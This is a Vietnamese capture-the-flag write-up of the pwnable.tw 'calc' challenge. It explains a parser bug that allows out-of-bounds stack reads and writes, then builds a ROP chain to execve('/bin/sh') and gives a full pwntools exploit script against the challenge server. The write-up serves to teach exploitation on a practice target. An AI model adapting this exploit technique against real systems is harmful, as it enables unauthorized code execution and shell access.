+++
title = 'Pwnable.tw - calc'
date = 2026-01-31T09:25:58+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## calc

`nc chall.pwnable.tw 10100`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/calc/calc
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Binary `statically linked` nên không cần leak libc - mọi gadget đều có sẵn trong chính nó và địa chỉ cố định.

Các hàm chính: `get_expr`, `eval`, `init_pool`, `parse_expr`, `calc`, `main`.

`calc()` @ `0x8049379`:

```c
char buf[0x400];        // ebp-0x40c
int  pool[361];         // ebp-0x5a0, pool[0] = số lượng phần tử

while (1) {
    memset(buf, 0, 0x400);
    if (!get_expr(buf, 0x400)) break;
    init_pool(pool);
    if (parse_expr(buf, pool))
        printf("%d\n", pool[pool[0]]);   // ebp+eax*4-0x59c
    fflush(stdout);
}
```

#### Bug - số không dương thì không push nhưng toán tử vẫn chạy

Trong `parse_expr`, sau khi `atoi` chuỗi số:

```asm
 8049136:  call   804e570 <atoi>
 804913b:  mov    DWORD PTR [ebp-0x74],eax
 804913e:  cmp    DWORD PTR [ebp-0x74],0x0
 8049142:  jle    8049164 <parse_expr+0x13a>   ; num <= 0 -> BỎ QUA push
 8049144:  ...                                 ; pool[0]++ ; pool[pool[0]] = num
```

Nếu biểu thức bắt đầu bằng một toán tử thì toán hạng trái rỗng, `atoi("") = 0`, nhánh `jle` bỏ qua phần push - nhưng `eval` vẫn chạy và vẫn lấy toán hạng theo `pool[0]`. Chỉ số dùng để đọc/ghi vì thế đi **quá biên mảng pool**, lên phần còn lại của stack frame `calc`.

Không có kiểm tra biên nào, nên `pool[N]` với `N` do ta chọn là **đọc và ghi tuỳ ý** trên stack.

Đo thử trực tiếp:

```bash
$ ./calc
=== Welcome to SECPROG calculator ===
+362
135184896
*362
134517913
```

`134517913 = 0x8049459`, nằm trong `main` (`main = 0x8049452`) - đúng là **địa chỉ trả về đã lưu của `calc`**. Vậy index **362** là slot saved EIP.

### 2. Khai thác

#### Primitive ghi

```py
def write(offset: int, data: int):
    INT_MAX = 0x7fffffff
    prefix = b'*%d' % offset
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'+' + str(data).encode())
```

Chia cho `INT_MAX` hai lần đưa slot về `0` (mọi giá trị 32-bit chia `INT_MAX` ra `0` hoặc `1`, lần hai thì chắc chắn `0`), rồi cộng `data` để đặt giá trị tuyệt đối. Ghi được một dword tuỳ ý vào slot tuỳ ý.

#### ROP chain

Binary static, NX bật, nên dựng chain gọi `execve("/bin/sh", NULL, NULL)` bằng `int 0x80`. Chuỗi `/bin/sh` không có sẵn nên phải tự ghi vào `.bss` (`0x80ebf48`) trước:

```py
chain = b""
chain += p32(0x80701c9) # add bh, bh; adc eax, 0x80ec9f0; pop edx; pop ecx; pop ebx; ret
chain += p32(0x80ebf48)
chain += p32(0x6e69622f)   # "/bin"
chain += p32(0x0)
chain += p32(0x80503a8) # push eax; pop eax; mov dword ptr [edx + 0xb8], ecx; ret
chain += p32(0x80701c9)
chain += p32(0x80ebf4c)
chain += p32(0x68732f)     # "/sh\0"
chain += p32(0x0)
chain += p32(0x80503a8)
chain += p32(0x8058ffc) # pop eax; or dh, dh; ret
chain += p32(0xb)          # __NR_execve
chain += p32(0x80701d0) # pop edx; pop ecx; pop ebx; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80ec000)    # ebx = "/bin/sh"
chain += p32(0x8070880) # int 0x80
```

Gadget ghi là `mov dword ptr [edx + 0xb8], ecx`, nên địa chỉ đích đưa vào `edx` phải trừ đi `0xb8`: `0x80ebf48 + 0xb8 = 0x80ec000`, đúng bằng con trỏ `/bin/sh` nạp vào `ebx` ở cuối.

Ghi cả chain vào stack từ index 362 trở đi:

```py
for i in range(0, len(chain), 4):
    write(main_offset + i//4, u32(chain[i:i+4]))
```

Gửi một dòng trống để `get_expr` trả 0, vòng lặp thoát, `calc` return vào chain.

Chạy local:

```bash
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/Pwn/pwnable.tw/calc  ./exploit.py LOCAL
[*] Switching to interactive mode
cat: /home/calc/flag: No such file or directory
```

`cat` chạy được nghĩa là shell đã lên. Sau đó bỏ `LOCAL` để bắn remote.

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'calc')
context.terminal = ['tmux', 'new-window']

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10100)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
    stub alarm
    break *calc+186
    continue
    '''.format(**locals())

io = start()
io.recvline()

def write(offset: int, data: int):
    INT_MAX = 0x7fffffff
    prefix = b'*%d' % offset
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'+' + str(data).encode())

main_offset = 362

chain = b""
chain += p32(0x80701c9) # add bh, bh; adc eax, 0x80ec9f0; pop edx; pop ecx; pop ebx; ret
chain += p32(0x80ebf48)
chain += p32(0x6e69622f)
chain += p32(0x0)
chain += p32(0x80503a8) # push eax; pop eax; mov dword ptr [edx + 0xb8], ecx; ret
chain += p32(0x80701c9)
chain += p32(0x80ebf4c)
chain += p32(0x68732f)
chain += p32(0x0)
chain += p32(0x80503a8)
chain += p32(0x8058ffc) # pop eax; or dh, dh; ret
chain += p32(0xb)
chain += p32(0x80701d0) # pop edx; pop ecx; pop ebx; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80ec000)
chain += p32(0x8070880) # int 0x80

for i in range(0, len(chain), 4):
    write(main_offset + i//4, u32(chain[i:i+4]))

io.sendline(b'')
io.sendline(b'cat /home/calc/flag')
io.interactive()
```
